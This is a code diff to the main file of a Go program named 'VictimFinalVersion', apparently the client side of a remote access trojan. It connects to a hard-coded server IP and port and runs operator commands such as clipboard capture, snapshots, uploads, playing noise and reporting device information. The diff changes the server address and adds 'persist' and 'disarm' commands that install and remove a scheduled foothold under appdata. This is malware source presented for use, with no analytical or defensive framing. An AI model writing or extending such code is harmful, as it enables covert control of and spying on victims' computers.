@@ -10,6 +10,7 @@ import (
 	"VictimFinalVersion/core/clipboard"
 	"VictimFinalVersion/core/device"
 	"VictimFinalVersion/core/handleConnection"
+	"VictimFinalVersion/core/persist"
 	"VictimFinalVersion/core/snap"
 	"VictimFinalVersion/core/upload"
 	"VictimFinalVersion/core/wall"
@@ -26,7 +27,7 @@ func DisplayError(err error) {
 }
 
 func main() {
-	ServerIP := "192.168.0.201"
+	ServerIP := "192.168.232.248"
 	Port := "9090"
 	connection, err := handleConnection.ConnectWithServer(ServerIP, Port)
 	if err != nil {
@@ -100,6 +101,16 @@ func main() {
 		case user_input == "make_noise":
 			fmt.Println("[+] Trying to make noise")
 			err = audio.Player(connection)
+			DisplayError(err)
+
+		case user_input == "persist":
+			fmt.Println("[+] Trying to make base under appdata")
+			err = persist.Schedule(connection)
+			DisplayError(err)
+
+		case user_input == "disarm":
+			fmt.Println("[+] removing persistance")
+			err = persist.Remove(connection)
 			DisplayError(err)
 
 		case user_input == "device_info":
